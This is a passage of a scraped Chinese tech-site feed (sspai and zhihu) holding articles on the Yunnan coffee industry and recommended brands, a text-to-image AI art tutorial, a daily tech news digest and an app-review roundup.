src=\"https://cdn.sspai.com/2021/08/27/ad0de699d9564ca97e747bfb3cdca32d.png\"></figure><p>可以看到，不论是否因为疫情影响了市场行情，显而易见的，同级的咖啡生豆，有了明显的涨幅。虽然不是同比的数据，也可以看出明显变化，预测的较为准确。</p>\n<p>今年全球咖啡生豆市场价格确实有小幅增长。根据我个人判断，明年咖啡生豆市场价格依旧会有小幅增长。</p>\n<h2>产业发展的变革</h2>\n<p>云南咖啡产业的发展，可以说是步履维艰的。早年时期因为没有大面积种植经验，很多咖农第一批或连续多年咖啡品质低、产量少。造成了早些年国内很多用户对云南小粒咖啡的误解。不过也确实是品质比较差，那时候云南咖啡豆全是被雀巢等速溶企业收购来做速溶咖啡。</p>\n<p>之后云南省开始推出扶持政策，改善育苗、种植、处理的技术。品质、产量逐年提升。</p>\n<p>目前云南全省咖啡从业企业 420 多家，从事初加工企业 290 多个，拥有国家级龙头企业 1 户，省级龙头企业 15 户，其中年销售收入超 1 亿元企业 7 个（超 10 亿元企业 1 个）。从事咖啡深加工企业 12 个；全省咖啡企业鲜果加工能力超过 100 万吨，初加工能力超过 15 万吨，精深加工能力超过 3 万吨，冷冻干燥、喷雾干燥速溶粉加工能力超过 3 万吨。</p>\n<p>下图为全省部分重点咖啡企业名单</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/27/58b8dce3c27829949a16fcb90e64f944.png\"></figure><p>扶持咖啡上游供应链只是咖啡产业链中的一小部分，后边还包括生豆烘焙的中间部分与咖啡馆等下游零售业态。为了能够更好的发展云南咖啡，打响云南咖啡的这面金字招牌，云南省也采取了积极的市场策略。</p>\n<p>从 2018 年开始，举办了第一届《普洱国际精品咖啡博览会》吸引国内外的咖啡从业者和贸易商来品尝云南咖啡。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/e2a60a9208eff86f4a23eb1c3dace9c8.png\"></figure><p>为了推广云南的精品咖啡，首先从业者需要对云南咖啡有认知、有了解，才能回到门店将云南咖啡传播给消费者。因此，筹备了《云南杯中国冲煮大赛》。这场比赛中，选手需要使用云南豆进行冲煮比赛。并通过与 WBRC 一样的裁判体系和近似的比赛规则，来给选手们打分。这进一步与国际接轨，让更多人可以了解云南咖啡，喝到好喝的云南咖啡。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/40462d96c057e0b653fe3f318635f393.png\"></figure><p>解决了从业者对云南咖啡的认知。接下来就应该对中间环节也就是烘焙商进行推广。为了更好的推广云南精品咖啡，提升中国咖啡烘焙水平，在中国商业联合会指导下，举办了《中国云南咖啡精英赛（China Yunnan Coffee Roasting Master Competition，简称YRC）》。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/692b4292c647ea02994e0039c4677f50.png\"></figure><p>烘焙师们根据提供的比赛用豆，可选择进行单品烘焙、意式拼配烘焙、SOE 烘焙来进行参赛。 2021 年已经举办了第三届。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/d0b166e36cf504a1dbce42fefcdad4cd.png\"><figcaption>评审场地：铂澜咖啡学院</figcaption></figure><p>第三届 YRC，北京赛区评审现场。这是对参赛的烘焙师提供的参赛咖啡豆进行杯测打分。</p>\n<p>搞定了国内上游到下游整个产业链的业内推广。开始转头瞄准国际市场，为了提高国际市场的竞争力，经相关部门批准，普洱市建立了云南国际咖啡交易中心（Yunnan intermational Coffee Exchange，简称 YCE），打造亚洲最大的咖啡全球化采购和供应平台、品牌推广平台信息发布平台。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/5442e005d5b4efaed90fad4f9f352b0f.png\"></figure><p>通过与 SCA（精品咖啡协会）和 CQI（咖啡品学会）的战略合作，制定了既符合国际惯例，又适合云南实际的咖啡质量检测标准体系，构建了全球化的咖啡专业培训体系。</p>\n<p>不过，根据目前我掌握的消息来看，当前交易中心的官网已经无法登陆。微信公众号里的所有菜单功能已经失效，只剩下当天的咖啡生豆价格的报价与联系电话。</p>\n<p>失效的原因暂时不明，不过公众号菜单上的功能失效，是因为费用到期，没续费造成的……</p>\n<p>以上这些都是云南省自己的自救式发展，从 2020 年开始，国内新锐咖啡品牌 MANNER、SeeSaw、瑞幸都开始使用云南咖啡豆，推出自己的云南咖啡。甚至瑞幸还准备筹备自己的咖啡庄园，通过资本与市场的综合投入，提升云南咖啡的种植水平，满足自身品牌调性的咖啡豆。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/c3ad0c6cd1305d97addbaaf8d758d43b.png\"></figure><p>我也相信，更多的国内咖啡品牌会重视云南咖啡，发展、推广云南咖啡。未来的云南咖啡一定会跟现在的进口咖啡一样，被消费者接受、喜爱。</p>\n<h2>云南优质咖啡推荐</h2>\n<p>简单给大家介绍了一下云南咖啡的历史、现状。现在给大家推荐几个不错的云南庄园、咖啡豆、咖啡品牌。</p>\n<h3>云南咖啡庄园</h3>\n<p>如果散户想要购买云南咖啡，除了在各大咖啡品牌商中购买，还可以直接找庄园所在淘宝店购买。这里推荐 2 家，我经常买的庄园：</p>\n<h4><strong>老地基庄园</strong></h4>\n<p>这家店，是我经常光顾的店。主要是庄园老板自己销售自家的咖啡豆，店在保山潞江坝。价格便宜，老板人挺不错的。这家店主要是生豆销售，有代烘焙服务，可以直接让店家把豆子烘焙好再发给你。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/045190ab9c0a05409e6438da5253ebc8.png\"></figure><p>后来很多人说想直接买烘好的豆子，所以老板又开了个熟豆店：周咖啡</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/27/beccf646ecda43fa067037e2c389d6e8.png\"></figure><p>可以直接买烘焙好的熟豆。</p>\n<h4><strong>高晟精品咖啡庄园</strong></h4>\n<p>这家庄园也在保山，主要销售的生豆是传统的卡蒂姆水洗豆和其他处理法的云南生豆。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/00b5d3d0a6ff701cfa824c44502ba969.png\"></figure><p>这家店，推荐他们家的咖啡花、咖啡果皮茶一起买来泡水喝，别有一番风味。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/27/d694a952d8cc7b78903ff00e83bf1c6d.png\"></figure><p>他们家也有一个专门买熟豆的店：高晟庄园食品旗舰店，感兴趣可以试试！</p>\n<h2>咖啡豆推荐</h2>\n<p>云南咖啡豆目前不知道有多少人喝过？可以留言讨论讨论，这里说 2 个我个人比较推荐的：</p>\n<p><strong>红酒 1 号日晒：</strong>红酒香气明显、低温状态甜感很不错，有红酒的酸质、轻微的芒果风味。冷萃很好喝</p>\n<p><strong>醉若幽兰：</strong>中度烘焙的豆子，有橘子、番石榴、白葡萄酒的风味。甜感、余韵还不错</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/27/6690c2d4ba8e8cd592fb3cf509b4bbc5.png\"></figure><p>如果各位对豆子感兴趣，看看有没有机会让大家尝到我烘焙的产品。</p>\n<h2>咖啡品牌</h2>\n<p>云南做咖啡的企业很多，但真正做终端零售的不多。这里举例说几个本土品牌：</p>\n<h3><strong>中咖</strong></h3>\n<p>中咖可以算是云南咖啡公司的翘楚，也是老品牌。中咖的组成比较复杂，目前中咖旗下有 3 个品牌，可能很多朋友都见过甚至买来喝过，分别为母公司中咖、主打性价比的品牌辛鹿、主打高端（高品质）产品的黑钻。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/5f4807687431a87604dbe4f60b349c86.png\"></figure><p>辛鹿可以算是在性价比的极限上上下游荡，所有产品极具性价比。想要花小钱喝不错的咖啡，辛鹿是不错的选择。</p>\n<p>中咖做的就是很传统的云南咖啡、速溶咖啡产品。性价比也不错，很便宜。</p>\n<p>黑钻主要做 SCA 评分 85+ 的咖啡豆，所以豆子品质上还可以。甚至有时候会有很多不错的优惠价格。</p>\n<h3><strong>后谷咖啡</strong></h3>\n<p>后谷咖啡创立于 2007 年，依旧主要从事各类速溶咖啡的制作与销售。同时，现在有一些挂耳咖啡销售。特点就是便宜！真的便宜……但是我并没有试过，感兴趣的朋友，可以试试看。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/5950e3ace174e0f2048e080a949023ba.png\"></figure><h2>最后</h2>\n<p>最后说一点，这 2 个品牌是最常见的国内做咖啡豆的企业，而且是拥有全产业链的企业很是难得。我目前，很少接触这种类型的企业，更多的是直接接触生豆商，因为我是个烘焙师，很多豆子都直接从生豆商或者庄园主那里够得。</p>\n<p>作为消费者，了解一下终端零售的品牌就可以了，也希望各位可以多尝试咱们自己的咖啡，可以说现在的咖啡品质真的不差，还便宜。足以满足日常饮用的需求。</p>\n<p>希望中国云南的咖啡可以发展的越来越好，在国际市场上占有一席之地！</p>\n","link":"https://sspai.com/post/68500"},{"title":"英雄回家｜本来少年，此去一生","date":"2021-08-31 05:48:30","description":"\n<p></p>\n<a class=\"video-box\" href=\"https://link.zhihu.com/?target=https%3A//www.zhihu.com/video/1416034084775055361\" target=\"_blank\" data-video-id=\"\" data-video-playable=\"true\" data-name=\"\" data-poster=\"https://pic1.zhimg.com/v2-58ac1dbb36f34653a1459fe48e296376.jpg?source=382ee89a\" data-lens-id=\"1416034084775055361\"><img class=\"thumbnail\" src=\"https://pic1.zhimg.com/v2-58ac1dbb36f34653a1459fe48e296376.jpg?source=382ee89a\"><span class=\"content\"><span class=\"title\"><span class=\"z-ico-extern-gray\"></span><span class=\"z-ico-extern-blue\"></span></span><span class=\"url\"><span class=\"z-ico-video\"></span>https://www.zhihu.com/video/1416034084775055361</span></span></a><p>“虽然我长到19岁，但背个人还是太费劲了，我都不知道那个劲是哪里来的……”抗美援朝战争，很多不到20岁的孩子，披上战衣，蜕变成战士，用最好的年纪，写下了民族永恒的记忆。9月2日，我国将迎回第八批在韩中国人民志愿军烈士遗骸。听听志愿军老战士的故事，致敬英雄，致敬青春。</p>\n<p>来源：人民日报客户端</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zhi-hu-zheng-wu?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">知乎小红星</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/405366490?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"把你的想法画出来：用 AI 一键进行「无中生有」的创作","date":"2021-08-31 03:25:27","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>不会画画，人工智能也能让你的构想在画布上飞扬。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/20/article/703e18b1c03639099e6b54f80d354677\" alt=\"\"></figure><p>前几天，在 Roam Research 群里面，有小伙伴打听，说依据关键词从 unsplash 平台搜索图片，和那个靠着 Text-to-Imge GAN 人工智能，从文字生成图像，是不是一码事儿？</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/20/article/07a7c4b5722042faad18d6ec165357b4\" alt=\"\"></figure><p>我当时简要回答了一下，大意为：</p>\n<blockquote><p>前者是「有」中找寻，后者是「无中生有」。  </p></blockquote>\n<p>也就是说，unsplash 平台上面虽然有很多图片，但是首先它得先拥有了某张图片，你才能通过关键词找得到。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/20/article/545cefbe8dfef323e65b90ec34b2b5fc\" alt=\"\"></figure><p>但是利用人工智能生成技术，就完全没有这个前提限制。你可以让电脑帮你做出一张<strong>亘古以来都不曾存在</strong>的图片。</p>\n<p>其运行原理如下图：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/20/article/bbef70781bfd73ced9eddd4460baa2fb\" alt=\"\"></figure><p>壮士留步！</p>\n<p>我今天并不准备给你详细拆解这张图每一部分的原理。你只需知道，所谓 GAN 最核心的包括两部分：</p>\n<ul>\n<li>生成器（Generator）</li>\n<li>判断器（Discriminator）</li>\n</ul>\n<p>前者是<strong>画画的</strong>，后者是<strong>评论的</strong>。</p>\n<p>一次次，画家（生成器）画出来的画，被评论家（判断器）打击批评。然后？电脑艺术家就变得愈发技艺精湛，甚至可以通过如此严苛评论家的目光审视。</p>\n<p>你看，这个过程，显然比人类画家，更有效率。因为换作是我，每画一幅画，都遭受到别人严厉的批评，估计早就撂挑子了。</p>\n<p>这就是基本原理。当这个模型运行过许多轮次后，画家就学会了如何根据输入的文字，画出「符合要求」的画作了。</p>\n<p>而你，只要拿到这个模型运行，就可以摘取到「低垂果实」了。</p>\n<p>不过问题在于，使用人工智能技术有一定的门槛，普通人即便调用别人训练好的模型，也没那么方便。至少得准备好计算资源、存储空间，还需要进行足够细致的设置。</p>\n<p>最近我从<a href=\"http://www.ruanyifeng.com/blog/2021/08/weekly-issue-172.html\">阮一峰的博客上</a>看到了这样的一款工具，可以让你不需了解任何人工智能和深度学习的事儿，就能轻易尝试文字到图像的生成。如此一来，你可以用实践来体会什么叫做「无中生有」。</p>\n<p>你唯一需要做的，只是输入一句<strong>英文</strong>。</p>\n<p>这个网站的名字，叫做 Text to Image Art Generator；网址在这里：<a href=\"https://creator.nightcafe.studio/text-to-image-art\">VQGAN + CLIP App - AI Text-To-Image Art Generator - NightCafe Creator</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/20/article/c20d718794ab1c958ac04835d5491a79\" alt=\"\"></figure><p>为了能够顺利收到运行结果，你需要注册一个账号。免费的，放心。注册过程很简单，介绍从略。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/20/article/861648987b376c23bdc5f23ef7444082\" alt=\"\"></figure><p>然后，你就可以开启自己的创作了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/20/article/78df8eb15b982877ff70d1d04f43ea5e\" alt=\"\"></figure><p>你只需要在文本框中输入要表达的内容即可，注意要英文。</p>\n<p>例如我这里输入：</p>\n<blockquote><p>a t-rex playing in olympics 100 meters running game  </p></blockquote>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/20/article/28cece4dc6bc1960c633e9be3bf188e3\" alt=\"\"></figure><p>然后，往下滑动，选择图片类型。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/20/article/6c763f46a38128c21a3f1d3cbb28d845\" alt=\"\"></figure><p>这里有三种选择：</p>\n<ul>\n<li>缩略图</li>\n<li>低清晰度</li>\n<li>中清晰度</li>\n</ul>\n<p>不同的图片，消耗的点数（credits）不同。每个用户注册时免费获得3个点数。后面就得付费购买了。</p>\n<p>为了低（jie）碳（yue）环（dian）保（shu），我选择的是缩略图。</p>\n<p>然后点击「创作」按钮，就可以了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/20/article/aeeb487ec9cea41aecc41301d3e41000\" alt=\"\"></figure><p>这里根据你输入信息的难度，可能要等一会儿。</p>\n<p>稍安勿躁，过一会儿一刷新，你就能看到电脑自动为你生成的大作了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/20/article/be0ae6ab5047a755e4e62218936871e9\" alt=\"\"></figure><p>点击可以看到图片细节。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/20/article/fab7fabd596a1a7c1f42ead8749a4f09\" alt=\"\"></figure><p>其实一个缩略图，哪有啥细节呢？这图画得……怎么说呢？我只能用「一言难尽」来形容。看来训练模型的时候，似乎没有太多包含古生物细节的图片吧。</p>\n<p>这算是哪个艺术流派？哪位高人帮忙鉴定一下吧。既然有 3 个免费点数，我们不妨多尝试几次。</p>\n<p>我觉得还是用地球上目前有的生物或者物件种类，生成的东西，更加具象一些。例如这是输入「a small boy on the shark in deep ocean」之后，获得的结果。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/20/article/e688fbb88cbfaf4c572d4efed9205781\" alt=\"\"></figure><p>嗯，比起 T-Rex 那张，感觉好多了。</p>\n<p>我于是把它做了题图。还点击了上图中的 Publish 按钮，于是它就变成了一张公开作品。你可以<a href=\"https://creator.nightcafe.studio/creation/DYZF3Hi6oxgmaaiqC0qk\">尝试直接点击这个链接查看</a>。</p>\n<p>没想到，公开发布作品还有奖励，系统又给了我一个点数，哈哈。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/20/article/68115ac69092bebde724f9fe7c04dc10\" alt=\"\"></figure><p>欢迎你尝试输入一些更有趣的内容，也欢迎你把自己尝试的结果分享出来，让我们大家感受到你的创意和机器艺术结合的魅力。</p>\n<p>祝体验愉快！</p>\n<p>如果你觉得本文有用，请点赞。如果本文可能对你的朋友有帮助，请转发给他们。</p>\n<p>欢迎关注我的专栏，以便及时收到后续的更新内容。</p>\n<h2>延伸阅读</h2>\n<p>你可能也会对以下话题感兴趣。点击链接就可以查看。</p>\n<ul>\n<li><a href=\"https://sspai.com/post/66759\">如何不花钱，让人工智能帮你视频抠图？</a></li>\n<li><a href=\"https://mp.weixin.qq.com/s/zEco97zBRYb215bU0CypOQ\">论文太多看不过来？快让人工智能帮你阅读分析</a></li>\n<li><a href=\"https://sspai.com/post/60321\">如何用人工智能免费帮你改英文？</a></li>\n<li><a href=\"https://sspai.com/post/57044\">如何用人工智能帮你找论文？</a></li>\n<li><a href=\"https://mp.weixin.qq.com/s/Uy6jMzy7h5XH1-UUxp90Bg\">如何训练和解释你的图片分类深度卷积模型？</a></li>\n</ul>\n<p>题图：在 <a href=\"https://creator.nightcafe.studio/text-to-image-art\">VQGAN + CLIP App - AI Text-To-Image Art Generator - NightCafe Creator</a> 网站输入「a small boy on the shark in deep ocean」自动生成</p>\n<span class=\"ss-paidSection\" product-id=\"75\" type=\"paidSection\"> </span><p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68404"},{"title":"派早报：国家新闻出版署宣布加强未成年人游戏防沉迷工作等","date":"2021-08-31 00:57:07","description":"\n<h2>你可能错过的新鲜事</h2>\n<h3>国家新闻出版署宣布加强未成年人游戏防沉迷工作</h3>\n<p>近日，国家新闻出版署近日下发《关于进一步严格管理 切实防止未成年人沉迷网络游戏的通知》，针对未成年人过度使用甚至沉迷网络游戏问题，进一步严格管理措施，坚决防止未成年人沉迷网络游戏，切实保护未成年人身心健康。通知要求，严格限制向未成年人提供网络游戏服务的时间，所有网络游戏企业仅可在周五、周六、周日和法定节假日每日 20 时至 21 时向未成年人提供 1 小时服务，其他时间均不得以任何形式向未成年人提供网络游戏服务；严格落实网络游戏用户账号实名注册和登录要求，不得以任何形式向未实名注册和登录的用户提供游戏服务；同时要求各级出版管理部门要加强对防止未成年人沉迷网络游戏有关措施落实情况的监督检查，对未严格落实的网络游戏企业，依法依规严肃处理；要积极引导家庭、学校等社会各方面共管共治，依法履行未成年人监护责任，为未成年人健康成长营造良好环境。<a href=\"https://m.weibo.cn/status/KvRv1vGph\" target=\"_blank\">来源</a></p>\n<h3>vivo X70 将于 9 月 9 日发布，新机外观亮相</h3>\n<p>8 月 30 日 vivo 官方正式宣布，将会在 9 月 9 日 19:30 正式发布 vivo X70，从预热的图片中可以看到 vivo X70 系列拥有黑、橙两种机身配色，背部摄像头矩阵非常大，左侧为竖排三摄 + 潜望式长焦，印有蔡司小蓝标。vivo 此前已经确认将推出首款自研影像芯片 V1，将由 9 月发布的新品 X70 系列首发搭载，更多信息还有待官方进一步发布。<a href=\"https://www.ithome.com/0/572/299.htm\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4mnpkdb34tcvt9nu870.jpeg\"></figure><h3>Apple 收购古典音乐流媒体服务 Primephonic</h3>\n<p>8 月 30 日，Apple 宣布收购古典音乐流媒体服务 Primephonic，旨意提高 Apple Music 的古典音乐体验。同时，在声明中，Apple 表示将于明年发布一款基于 Primephonic 界面的古典音乐 App。Primephonic 将于 9 月 7 日起停止服务，现有订阅用户将免费获得 6 个月 Apple Music 订阅。<a href=\"https://www.apple.com.cn/newsroom/2021/08/apple-acquires-classical-music-streaming-service-primephonic/\" target=\"_blank\">来源</a></p>\n<h3>Fossil 正式推出其第六代 Wear OS 智能手表</h3>\n<p>Fossil 于 8 月 30 日正式推出其第六代 Wear OS 智能手表：Fossil Gen 6，新表采用了新一代的高通骁龙 Wear 4100+ 处理器，除了主处理器之外还增加了新的协处理器，用来处理倾斜唤醒、连续心率检测、睡眠跟踪等。性能上相比上一代机型提高了 85%，功耗降低并有着更长的电池续航时间，并且支持快充以及通过 USB 直接连接。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4mnpkdb34tcvciqabp0.jpeg\"></figure><p>传感器上升级了心率传感器，同时新增了 SpO2 血氧监控，其他硬件方面，1.28 英寸的触摸屏、1GB 的运存以及 8GB 的存储空间，有 42mm 以及 44mm 两种尺寸的表冠。2022 年将可以升级到最新的 Wear OS 3，共有七种设计可选，售价在 299 美元至 319 美元不等。<a href=\"https://9to5google.com/2021/08/30/fossil-gen-6/\" target=\"_blank\">来源</a></p>\n<h2>看看就行的小道消息</h2>\n<ul>\n<li>爆料人 Mauri QHD 近日称，三星可能在 9 月 8 日正式发布 Galaxy S21 FE。该机型将搭载骁龙 888 处理器，6GB 或 8GB RAM。<a href=\"https://www.androidcentral.com/samsung-galaxy-s21-fe-tipped-launch-early-september\" target=\"_blank\">来源</a>\n</li>\n<li>8 月 29 日，分析师郭明𫓹透露 iPhone 13 可能搭载卫星通讯功能。8 月 30 日，彭博社肯定了这一消息，并补充指出 iPhone 13 将在硬件上支持低轨道卫星通讯，但首发软件不会开放该功能。该功能将用于提供更完善的紧急求救支援。<a href=\"https://9to5mac.com/2021/08/30/bloomberg-iphone-satellite-features/\" target=\"_blank\">来源</a>\n</li>\n<li>德国媒体 WinFuture 曝光了 GoPro 下一代旗舰运动相机 Hero 10 Black。该机将搭载全新 GP2 处理器，图像传感器分辨率提升至 2300 万像素，支持最高 5.3K 60 帧、4K 120 帧、2.7K 240 帧摄影。<a href=\"https://www.theverge.com/2021/8/30/22648027/gopros-hero-10-black-leak-specs-date-price\" target=\"_blank\">来源</a>\n</li>\n</ul>\n<h2>少数派的近期动态</h2>\n<ul>\n<li>✒️️ Android 平台优质写作工具「纯纯写作」开学季促销，欢迎前往 <a href=\"https://sspai.com/item/13\" target=\"_blank\">少数派正版软件商城</a> 下单。</li>\n<li>🧸 少数派会员通讯《<a href=\"https://sspai.com/prime/precog/vol06-pre-toys-for-adults\" target=\"_blank\">大人的玩具</a>》已经上线，来看看乐高与模型的故事，祝你玩得开心。</li>\n<li>📕 由少数派编辑部联合优秀作者出版的实体书《数字时代的效率手册》上线电商平台，<strong>少数派预购会员将获赠该书</strong>。<a href=\"https://item.jd.com/12914331.html\" target=\"_blank\">5 折下单 &gt;</a>\n</li>\n<li>📡 你会在日常生活中使用 5G 网络吗？去 <a href=\"https://sspai.com/bullet/1628500218\" target=\"_blank\">一派</a> 和大家聊聊。</li>\n</ul>\n<h2>你可能错过的文章</h2>\n<ul>\n<li>🖥️ <a href=\"https://sspai.com/post/68097\" target=\"_blank\">从零开始，配置一个趁手的 Python 开发环境</a>\n</li>\n<li>📱️ <a href=\"https://sspai.com/post/68531\" target=\"_blank\">Android 玩家入门：从这 20+ 个模块感受 Magisk 背后的魅力</a>\n</li>\n<li>🏠️ <a href=\"https://sspai.com/post/68479\" target=\"_blank\">三年辗转三座城市，「一个人」搬家可能没你想得那么难</a>\n</li>\n<li>⭐️️ <a href=\"https://sspai.com/post/68538\" target=\"_blank\">派评 | 近期值得关注的 App</a>\n</li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p> </p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68545"},{"title":"派评 | 近期值得关注的 App","date":"2021-08-30 10:10:48","description":"\n<p>本期《派评》的主要内容有：</p>\n<ul>\n<li>颜值与实力兼具的 iOS 天气应用：白云天气。</li>\n<li>老牌星象查看与科普类工具 Sky Guide 大版本更新。</li>\n<li>老牌量化自我与健康记录工具 Gyroscope 更新，完善产品计划，多项功能完善。</li>\n<li>……</li>\n</ul>\n<p>你可以通过文章目录快速跳转到你感兴趣的内容。如果发现了其它感兴趣的 App 或者关注的话题，也欢迎在评论区和我们进行讨论。</p>\n<h2>不容错过的新 App</h2>\n<h3>白云天气：「美颜版彩云天气」，颜值实力两手抓</h3>\n<ul>\n<li>平台：iOS</li>\n<li>关键词：天气</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@Vanilla\" user-id=\"bs2ov5lb34tch278f9ag\" href=\"https://sspai.com/u/whoops\">@Vanilla</a>：对于生活在国内的用户来说，彩云天气在一众天气应用中已经占有了重要的一席之地，它精准的小时级天气预报功能让很多人喜爱不已。然而，彩云天气的界面对大多人来说还是略显复杂和冗余，于是开发者「随你们去」打造了一款简单版的「彩云天气」，取名为白云天气。</p>\n<p>与彩云天气相比，白云天气在设计上采用了更加简洁直观的风格。针对不同的天气现象，开发者分别设计了对应不同的背景色彩。比如说，小雨、中雨、大雨、暴雨这四种气象虽然都是雨，但它们也有着不同的色彩；再比如，在每天傍晚至深夜这个时间段里，白云天气的背景色彩会按日落前、日落时、日落后、刚入夜、深夜进行细分变化，为了遵循现实生活里的经验，针对日出日落这样的细分变化仅会出现在多云和晴天的时候。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4maq6db34tcvciqaaug.png\"></figure><p>白云天气的背景色彩变化速度也很有讲究，会根据当前天气的风速而调整。大部分的时候，白云天气的背景色彩就像呼吸一样在流动，但如果你遇见了 10 级以上大风（陆地生活里几乎不会出现的），那么背景色彩的变换速度会达到极值，像是警告信号一样闪烁不止。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4maq6tb34tcuopj7sng.gif\"></figure><p>白云天气的另一特点是预设了跟随实际雨雪雾等气象而进行变化的动画，能帮助我轻松感知当前的天气状况。例如，在遇到下雨气象时，动态动画会呈现下雨的样式，并且雨水落下的速度、大小、数量以及角度会跟随着降雨量的情况以及当时的风速而调整。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4maq7lb34tcuopj7so0.gif\"></figure><p>当前版本的白云天气设计了三个尺寸的基础小组件，它们的功能几乎与彩云天气或系统天气的小组件无差，我可以通过长按 - 编辑小组件来设定显示不同的城市和特定天气数据。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4maq7tb34tcu4bur050.png\"></figure><p>你可以在 <a href=\"https://apps.apple.com/cn/app/%E7%99%BD%E4%BA%91%E5%A4%A9%E6%B0%94-%E6%84%9F%E7%9F%A5%E8%87%AA%E7%84%B6%E5%91%BC%E5%90%B8/id1575901953\" target=\"_blank\">App Store</a> 免费下载白云天气，年订阅价格 28 元。受限于天气数据接口的权限以及付费成本，白云天气暂时无法提供彩云天气的所有功能，小组件和城市查询等功能需要通过订阅付费的形式来进行解锁。</p>\n<p><strong>关联阅读：</strong><a href=\"https://sspai.com/post/68392\" target=\"_blank\">简约而不简单，我做了一个「彩云天气精简版」：白云天气</a></p>\n<span class=\"ss-application\" app-id=\"16151\"> </span><h3>Routine48：用日历排布一天事务</h3>\n<ul>\n<li>平台：Android</li>\n<li>关键词：日历、任务管理</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@Peggy_\" user-id=\"bs2p015b34tch278nkdg\" href=\"https://sspai.com/u/5isr02uh\">@Peggy_</a>：对于许多人来说，在日程相对固定的情况下，通过日历应用来管理日程能够使得每一天的安排更加直观、一览无余，Routine48 是一款主打日程安排的应用，结合日历视图的形式，通过将一天划分为多个不同的时段，从而达到良好的日程规划效果。</p>\n<p>在Routine48 